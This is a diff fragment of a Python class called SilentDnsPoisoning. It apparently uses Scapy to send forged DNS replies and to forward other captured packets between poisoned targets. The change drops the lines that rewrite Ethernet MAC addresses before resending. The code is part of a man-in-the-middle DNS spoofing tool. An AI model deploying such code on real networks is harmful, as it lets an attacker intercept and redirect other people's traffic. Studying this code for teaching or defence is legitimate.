@@ -53,18 +53,12 @@ class SilentDnsPoisoning:
                                         print("Fake packet sent")
                                 if linkPresent == False:
                                     # No link match -> resend the DNS request to its true receiver
-                                    pkt[Ether].src = pkt[Ether].dst
-                                    pkt[Ether].dst = target1MAC[i]
                                     send(pkt, iface=interface)
                             else:
                                 # This is not a DNS request -> resend the packet to its true receiver
-                                pkt[Ether].src = pkt[Ether].dst
-                                pkt[Ether].dst = target1MAC[i]
                                 send(pkt, iface=interface)
                         else:
                             # Packet doesn't have DNS layer -> resend the packet to its true receiver
-                            pkt[Ether].src = pkt[Ether].dst
-                            pkt[Ether].dst = target1MAC[i]
                             sendp(pkt, iface=interface)
                 # same but with source target 2
                 elif pkt[Ether].src in target2MAC:
